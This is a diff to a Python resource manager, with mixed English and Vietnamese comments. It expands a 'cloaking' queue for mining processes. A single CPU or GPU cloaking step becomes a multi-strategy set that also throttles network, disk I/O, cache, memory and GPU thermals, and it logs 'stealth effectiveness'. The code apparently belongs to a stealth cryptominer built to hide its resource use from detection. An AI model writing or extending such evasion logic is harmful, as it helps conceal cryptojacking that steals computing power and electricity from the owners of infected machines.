@@ -338,7 +338,7 @@ class ResourceManager(IResourceManager):
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
-        ✅ ENHANCED: Metadata-aware cloaking queue với direct classification access
+        ✅ ENHANCED: Comprehensive multi-strategy cloaking queue với full resource control
         """
         pid = process.pid
         name = process.name
@@ -356,22 +356,169 @@ class ResourceManager(IResourceManager):
             is_gpu = process.is_gpu_process()
             strategy_hints = process.get_strategy_hints()
             
+            # ✅ COMPREHENSIVE STRATEGY ASSIGNMENT: Multi-dimensional cloaking
+            primary_strategy = 'gpu_cloaking' if is_gpu else 'cpu_cloaking'
+            
+            # ✅ CONFIGURABLE ADDITIONAL STRATEGIES: Based on config and process type
+            additional_strategies = self._get_additional_strategies(process_type, strategy_hints)
+            
+            # ✅ COMBINED STRATEGY LIST: Primary + Additional for comprehensive cloaking
+            all_strategies = [primary_strategy] + additional_strategies
+            
+            # ✅ STRATEGY FILTERING: Remove strategies not available in current system
+            available_strategies = self._filter_available_strategies(all_strategies)
+            
             task = {
                 'type': 'cloaking',
                 'process': process,
-                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking'],
+                'strategies': available_strategies,  # ✅ MULTIPLE STRATEGIES for comprehensive control
                 'process_type': process_type,
-                'strategy_hints': strategy_hints  # ✅ Pass optimization hints
+                'strategy_hints': strategy_hints,
+                'primary_strategy': primary_strategy,  # ✅ Track primary for priority handling
+                'additional_strategies': additional_strategies  # ✅ Track additional for logging
             }
             
-            # ✅ UNIFIED: Single queue với rich metadata
+            # ✅ UNIFIED: Single queue với rich multi-strategy metadata
             self.resource_adjustment_queue.put((priority, count_val, task))
             self.process_states[pid] = "cloaking"
             
-            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for {process_type} cloaking with hints")
+            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for comprehensive {process_type} cloaking")
+            self.logger.info(f"🎯 Applied strategies: {available_strategies}")
             
         except Exception as e:
             self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")
+
+    def _get_additional_strategies(self, process_type: str, strategy_hints: Dict[str, Any]) -> List[str]:
+        """
+        ✅ NEW: Determine additional strategies based on process type and configuration
+        
+        :param process_type: 'CPU' hoặc 'GPU' process type
+        :param strategy_hints: Optimization hints từ process metadata
+        :return: List of additional strategy names
+        """
+        try:
+            # ✅ BASE ADDITIONAL STRATEGIES: Core resource control strategies
+            base_strategies = ['network', 'disk_io', 'cache', 'memory']
+            
+            # ✅ STRATEGY HINTS PROCESSING: Custom strategy selection
+            if strategy_hints:
+                # Disable specific strategies if hinted
+                disabled_strategies = strategy_hints.get('disabled_strategies', [])
+                enabled_additional = [s for s in base_strategies if s not in disabled_strategies]
+                
+                # Add custom strategies if specified
+                custom_strategies = strategy_hints.get('additional_strategies', [])
+                enabled_additional.extend(custom_strategies)
+                
+                return enabled_additional
+            
+            # ✅ PROCESS TYPE SPECIFIC: Different strategies for CPU vs GPU
+            if process_type == 'GPU':
+                # GPU processes typically need more aggressive resource control
+                return base_strategies + ['thermal_control']  # Add thermal management
+            elif process_type == 'CPU':
+                # CPU processes may need different priority on certain resources
+                return base_strategies
+            else:
+                # Unknown process type, use conservative approach
+                return ['network', 'memory']  # Minimal additional strategies
+                
+        except Exception as e:
+            self.logger.error(f"Error determining additional strategies: {e}")
+            return ['network', 'memory']  # Fallback to basic strategies
+
+    def _filter_available_strategies(self, strategies: List[str]) -> List[str]:
+        """
+        ✅ NEW: Filter strategies based on system availability and configuration
+        
+        :param strategies: List of strategy names to filter
+        :return: List of available strategy names
+        """
+        try:
+            available = []
+            
+            for strategy in strategies:
+                # ✅ CHECK STRATEGY AVAILABILITY: Verify each strategy can be used
+                if self._is_strategy_available(strategy):
+                    available.append(strategy)
+                else:
+                    self.logger.debug(f"Strategy '{strategy}' not available, skipping")
+            
+            # ✅ ENSURE PRIMARY STRATEGY: Always include at least primary strategy
+            if not available and strategies:
+                primary = strategies[0]  # First strategy is primary
+                if self._is_strategy_available(primary):
+                    available.append(primary)
+                    self.logger.warning(f"Only primary strategy '{primary}' available")
+            
+            return available
+            
+        except Exception as e:
+            self.logger.error(f"Error filtering available strategies: {e}")
+            # Fallback to primary strategy only
+            return [strategies[0]] if strategies else []
+
+    def _is_strategy_available(self, strategy_name: str) -> bool:
+        """
+        ✅ NEW: Check if a specific strategy is available in current system
+        
+        :param strategy_name: Name of strategy to check
+        :return: True if strategy is available and can be used
+        """
+        try:
+            # ✅ CONFIG-BASED AVAILABILITY: Check configuration settings
+            strategy_config = self.config.get('cloaking_strategies', {})
+            if not strategy_config.get(strategy_name, {}).get('enabled', True):
+                return False
+            
+            # ✅ SYSTEM-BASED AVAILABILITY: Check system capabilities
+            availability_checks = {
+                'cpu_cloaking': True,  # Always available
+                'gpu_cloaking': self.is_gpu_initialized(),  # Requires GPU
+                'network': self._check_network_availability(),
+                'disk_io': self._check_disk_io_availability(), 
+                'cache': self._check_cache_availability(),
+                'memory': self._check_memory_availability(),
+                'thermal_control': self.is_gpu_initialized()  # GPU thermal control
+            }
+            
+            return availability_checks.get(strategy_name, False)
+            
+        except Exception as e:
+            self.logger.debug(f"Error checking strategy availability for '{strategy_name}': {e}")
+            return False
+
+    def _check_network_availability(self) -> bool:
+        """Check if network cloaking is available (iptables, tc)"""
+        try:
+            # Check if we have network resource manager
+            return 'network' in getattr(self.shared_resource_manager, 'resource_managers', {})
+        except:
+            return False
+
+    def _check_disk_io_availability(self) -> bool:
+        """Check if disk I/O cloaking is available (ionice)"""
+        try:
+            # Check if we have disk I/O resource manager
+            return 'disk_io' in getattr(self.shared_resource_manager, 'resource_managers', {})
+        except:
+            return False
+
+    def _check_cache_availability(self) -> bool:
+        """Check if cache cloaking is available"""
+        try:
+            # Check if we have cache resource manager
+            return 'cache' in getattr(self.shared_resource_manager, 'resource_managers', {})
+        except:
+            return False
+
+    def _check_memory_availability(self) -> bool:
+        """Check if memory cloaking is available (cgroups memory)"""
+        try:
+            # Check if we have memory resource manager
+            return 'memory' in getattr(self.shared_resource_manager, 'resource_managers', {})
+        except:
+            return False
 
     # -----------------------------------------------------------------------------------------
     # METRICS (SYNC)
@@ -515,31 +662,81 @@ class ResourceManager(IResourceManager):
                 if task['type'] == 'cloaking' and self.shared_resource_manager:
                     strategies = task.get('strategies', [])
                     strategy_hints = task.get('strategy_hints', {})
+                    primary_strategy = task.get('primary_strategy', strategies[0] if strategies else 'cpu_cloaking')
+                    additional_strategies = task.get('additional_strategies', [])
+                    
+                    self.logger.info(f"🎯 [Comprehensive Cloaking] Applying {len(strategies)} strategies for PID={pid}")
+                    self.logger.info(f"🔧 Primary: {primary_strategy}, Additional: {additional_strategies}")
+                    
+                    # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
+                    strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                     
                     for strat in strategies:
-                        # ✅ TYPE-SPECIFIC CACHING: Include process type in cache key
-                        cache_key = f"{strat}_{process_type}"
-                        
-                        if cache_key not in self.shared_resource_manager.strategy_cache:
-                            # ✅ TYPE-AWARE CREATION: Pass type and hints to factory
-                            s = CloakStrategyFactory.create_strategy(
-                                strat, self.config, self.logger, 
-                                self.shared_resource_manager.resource_managers,
-                                process_type=process_type,
-                                strategy_hints=strategy_hints
+                        try:
+                            # ✅ TYPE-SPECIFIC CACHING: Include process type in cache key
+                            cache_key = f"{strat}_{process_type}"
+                            
+                            if cache_key not in self.shared_resource_manager.strategy_cache:
+                                # ✅ TYPE-AWARE CREATION: Pass type and hints to factory
+                                s = CloakStrategyFactory.create_strategy(
+                                    strat, self.config, self.logger, 
+                                    self.shared_resource_manager.resource_managers,
+                                    process_type=process_type,
+                                    strategy_hints=strategy_hints
+                                )
+                                self.shared_resource_manager.strategy_cache[cache_key] = s
+                                self.logger.info(f"🎯 [Worker] Created comprehensive strategy: {cache_key}")
+                            else:
+                                s = self.shared_resource_manager.strategy_cache[cache_key]
+                                self.logger.debug(f"♻️ [Worker] Reused cached strategy: {cache_key}")
+
+                            # ✅ STRATEGY APPLICATION: Apply each strategy with error handling
+                            if s and hasattr(s, 'apply'):
+                                s.apply(p)
+                                strategy_results['applied'].append(strat)
+                                self.logger.info(f"✅ [Strategy] {strat} applied successfully for PID={pid}")
+                            else:
+                                strategy_results['failed'].append(strat)
+                                self.logger.warning(f"❌ [Strategy] {strat} not applicable for PID={pid}")
+                                
+                        except Exception as strategy_error:
+                            strategy_results['failed'].append(strat)
+                            # ✅ STRATEGY-SPECIFIC ERROR HANDLING: Don't fail entire process for one strategy
+                            is_primary = (strat == primary_strategy)
+                            error_level = "ERROR" if is_primary else "WARNING"
+                            self.logger.log(
+                                logging.ERROR if is_primary else logging.WARNING,
+                                f"❌ [{error_level}] Strategy '{strat}' failed for PID={pid}: {strategy_error}"
                             )
-                            self.shared_resource_manager.strategy_cache[cache_key] = s
-                            self.logger.info(f"🎯 [Worker] Created type-specific strategy: {cache_key}")
-                        else:
-                            s = self.shared_resource_manager.strategy_cache[cache_key]
-                            self.logger.debug(f"♻️ [Worker] Reused cached strategy: {cache_key}")
+                            
+                            # ✅ PRIMARY STRATEGY FAILURE: More serious, but continue with other strategies
+                            if is_primary:
+                                self.logger.error(f"🚨 Primary strategy '{strat}' failed - process may not be fully cloaked")
 
-                        if s and hasattr(s, 'apply'):
-                            s.apply(p)
-
-                    self.process_states[pid] = "cloaked"
+                    # ✅ COMPREHENSIVE CLOAKING STATUS: Determine overall success
+                    applied_count = len(strategy_results['applied'])
+                    failed_count = len(strategy_results['failed'])
+                    primary_applied = primary_strategy in strategy_results['applied']
                     
-                    self.logger.info(f"✅ {process_type} PID={pid} cloaked successfully with optimized strategy")
+                    if applied_count > 0:
+                        self.process_states[pid] = "cloaked"
+                        success_level = "FULL" if failed_count == 0 else "PARTIAL"
+                        self.logger.info(f"✅ [{success_level}] {process_type} PID={pid} cloaked: {applied_count}/{strategy_results['total']} strategies")
+                        self.logger.info(f"📊 Applied: {strategy_results['applied']}")
+                        
+                        if failed_count > 0:
+                            self.logger.warning(f"⚠️ Failed strategies: {strategy_results['failed']}")
+                            
+                        # ✅ PRIMARY STRATEGY SUCCESS CHECK
+                        if primary_applied:
+                            self.logger.info(f"🎯 Primary strategy '{primary_strategy}' successfully applied")
+                        else:
+                            self.logger.warning(f"🚨 Primary strategy '{primary_strategy}' failed - reduced stealth effectiveness")
+                    else:
+                        # ✅ COMPLETE FAILURE: All strategies failed
+                        self.process_states[pid] = "cloaking_failed"
+                        self.logger.error(f"❌ [FAILED] No strategies applied for {process_type} PID={pid}")
+                        self.logger.error(f"💀 All strategies failed: {strategy_results['failed']}")
 
                 self.resource_adjustment_queue.task_done()
 
